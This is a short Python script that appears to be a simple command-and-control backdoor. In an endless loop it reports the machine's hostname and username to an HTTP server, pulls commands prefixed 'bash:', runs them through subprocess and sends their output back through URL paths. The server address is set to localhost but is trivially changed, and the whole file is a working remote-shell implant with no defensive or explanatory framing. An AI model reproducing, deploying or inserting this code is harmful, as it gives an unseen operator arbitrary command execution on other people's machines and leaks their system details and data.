import urllib.request
import socket
import getpass
import time
import subprocess

while True:
    host = "localhost"
    hostname = socket.gethostname()
    username = getpass.getuser()
    content = urllib.request.urlopen('http://' + host + "/conn/" + hostname + "/" + username + "/").readline()
    content = str(content)[2:-1]
    commands = []
    
    if content == '':
        time.sleep(2)
        continue
    else:
        commands = content.split(': ')
    
    if commands[0] == 'bash':
        process = subprocess.Popen(commands[1].split(), stdout=subprocess.PIPE)
        output, error = process.communicate()
        output = str(output)[2:-1]
        print(output)
        urllib.request.urlopen('http://' + host + "/out/" + hostname + "/" + str(output) + "/")
    else:
        pass


    time.sleep(2)